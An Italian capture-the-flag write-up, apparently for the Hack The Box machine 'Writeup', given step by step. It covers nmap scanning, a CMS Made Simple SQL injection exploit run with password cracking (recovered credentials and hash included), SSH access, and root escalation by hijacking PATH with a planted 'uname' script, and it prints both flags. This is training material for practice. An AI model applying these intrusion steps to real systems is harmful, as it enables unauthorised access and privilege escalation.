@@ -1,0 +1,71 @@
+1)nmap -sC -sV -oA nmap/scan 10.10.10.138
+	porte aperte:80(http),22(ssh)
+	80: -> indica il path /writeup/ come escluso da robots.txt
+
+2) usare url http://10.10.10.138/writeup/ (come trovato da nmap)
+	analizzando sorgente pagina si vede che si fa riferimento a "CMS Made Simple"
+
+3) cercando exploit per CMS Made Simple si trova exploit per sqli. Visto che il copyright per CMS è del 2019 si devono cercare solo exploit del 2019.Scaricato exploit da https://packetstormsecurity.com/files/152356/CMS-Made-Simple-SQL-Injection.html
+	modifiche al codice: TIME=3
+	lanciato con: python sql_i.py -u http://10.10.10.138/writeup/ --crack -w <wordlist> 
+	wordlist usata: rockyou.txt
+	output:
+		[+] Salt for password found: 5a599ef579066807
+		[+] Username found: jkr
+		[+] Email found: jkr@writeup.htb
+		[+] Password found: 62def4866937f08cc13bab43bb14e6f7
+		[+] Password cracked: raykayjay9
+
+4) provo ad accedere ad ssh (porta 22 come riportato da nmap) usando le credenziali trovate:
+	comando: ssh 10.10.10.138 -l jkr   //senza mettere -l jkr fa entrare come root ma non ho ancora la pass
+	password: raykayjay9
+
+5) usando semplicemente ls c'è un file chiamato user.txt che contiene la chiave dell'user: d4e493fd4068afc9eb1aa6a55319f978
+
+6) usando id è possibile vedere in quali gruppi si trova l'utente
+	output:uid=1000(jkr) gid=1000(jkr) groups=1000(jkr),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),50(staff),103(netdev)
+il gruppo interessante potrebbe essere 50(staff)
+
+7) cerco i files / dirs a cui il group staff ha accesso
+	comando: find / -group staff 2>/dev/null
+	significato:
+			find       = Find command
+			/          = from root Directory down
+			-group     = search for a group where ...
+			staff       = ...group name equals 'staff'
+			2          = Error Output ...
+			>          = ...is redirected...
+			/dev/null  = ...to device NULL (no Output)
+
+8)download di pspy sulla macchina ( l'ho scaricato sulla mia e poi l'ho trasferito su writeup)
+	comando: scp Downloads/pspy32 jkr@10.10.10.138:/home/jkr/
+
+
+
+9) controllando i processi tramite pspy si nota che ogni volta che una shell ssh viene accettata:
+	sshd: [net]       
+	sshd: [accepted]
+vengono eseguiti in sequenza i seguenti comandi:
+	(1)sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
+	(2)run-parts --lsbsysinit /etc/update-motd.d 
+	(3)uname -rnsom 
+	significato:
+		in primo luogo imposta la variabile di ambiente PATH che è molto importante: ogni volta che un utente esegue un comando senza specificare il path assoluto, esso viene cercato nelle varie 
+		cartelle specificate in path (separate da ":"), in ordine di come sono scritte da sinistra a destra.
+		Questo è molto importante perchè il terzo comando viene richiamato senza percorso assoluto.
+
+10)Uso il comando whereis uname e ottengo come risultato 
+	uname: /bin/uname /usr/share/man/man1/uname.1.gz 
+Questo signfica che si trova nella cartella più a destra nella var PATH, quindi l'ultima ad essere controllata, se si riescce ad accedere ad una qualunque delle directory precedenti e a mettere in una di queste un eseguibile che si chiama proprio uname, esso verrà eseguito, con privilegi di root, al posto dell'uname "originale". Dal punto 7 so che ho accesso a /usr/local/bin.
+
+11)vado in  /usr/local/bin e attraverso "vi" creo un nuovo file chiamato proprio uname in cui scrivo i comandi che voglio eseguire quando verrà chiamato, ad esempio (visto che in questo caso voglio solo avere il flag di root)
+	cp /root/root.txt /tmp
+	chmod 777 /tmp/root.txt
+esco e lo rendo eseguibile (chmod +x uname)
+
+12)chiudo la sessione ssh e la riapro in modo tale da far scattare il trigger per l'esecuzione, se faccio semplicemente cat /tmp/root.txt ottengo il flag di root: eeba47f60b48ef92b734f9b6198d7226
+
+---------------------------------------------------------------
+potevo mettere qualsiasi comando nell'eseguibile uname creato, come ad esempio far partire una shell verso il mio host ecc.
+
+
